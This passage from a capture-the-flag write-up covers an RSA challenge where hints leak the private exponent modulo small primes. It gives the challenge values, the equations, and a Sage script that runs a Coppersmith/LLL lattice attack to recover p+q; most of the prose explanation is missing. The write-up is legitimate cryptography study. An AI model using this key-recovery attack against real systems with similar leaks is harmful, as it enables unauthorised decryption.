</span><br><span class="line">    flag_prefix = <span class="string">b&#x27;NepCTF&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(flag_prefix)</span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    pt = bytes_to_long(flag[<span class="built_in">len</span>(flag_prefix):-<span class="number">1</span>])</span><br><span class="line">    ct = <span class="built_in">pow</span>(pt, e, N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ct=<span class="subst">&#123;<span class="built_in">hex</span>(ct)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line"><span class="string">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>e</code><code>N</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo></mo><msup><mi>N</mi><mn>0.33</mn></msup></mrow><annotation encoding="application/x-tex">d\approx N^{0.33}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">3</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span><strong>boneh durfee</strong> <code>0.292</code><strong></strong></p><p><code>hints.append(d%li)</code><strong>CRT</strong><code>d</code><strong></strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo></mo><mi>d</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>M</mi></mrow><annotation encoding="application/x-tex">d_{low}\equiv d\ mod\ M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msub><mi>k</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d=k_{1}M+d_{low}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><code>d</code><code>copper</code><strong></strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo></mo><mn>1</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed\equiv 1\ mod\ \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>=</mo><mi>k</mi><mo></mo><mo stretchy="false">(</mo><mi>N</mi><mo></mo><mi>p</mi><mo></mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ed=k*(N-p-q+1)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><strong></strong><strong></strong><code>CTF</code><code>boneh durfee</code>()<br />(orz)</p><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>+</mo><mi>e</mi><mo></mo><msub><mi>k</mi><mn>1</mn></msub><mi>M</mi><mo></mo><mn>1</mn><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo></mo><mo stretchy="false">(</mo><mi>N</mi><mo></mo><mi>p</mi><mo></mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_{low}+e*k_{1}M-1=k_{2}*(N-p-q+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><code>k1,k2</code>(<code>p q</code>)<strong>copper</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo></mo><mn>1</mn><mo></mo><mi>k</mi><mo></mo><mo stretchy="false">(</mo><mi>N</mi><mo></mo><mi>p</mi><mo></mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo></mo><mn>0</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mo stretchy="false">(</mo><mi>e</mi><mo></mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_{low}-1-k*(N-p-q+1)\equiv 0\ mod\ (e*M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>X</mi><mo>=</mo><mi>k</mi><mo separator="true">,</mo><mi>Y</mi><mo>=</mo><mi>p</mi><mo>+</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">X = k,Y=p+q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p><code>k</code><strong>676</strong><code>p+q</code><strong>1024</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(e*M))</span><br><span class="line">f = e*d_low -<span class="number">1</span> - x*(N - y + <span class="number">1</span>)</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">676</span>,<span class="number">2</span>^<span class="number">1024</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p_q = <span class="subst">&#123;root[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>Sage</code><code>Python</code><code>Python</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> 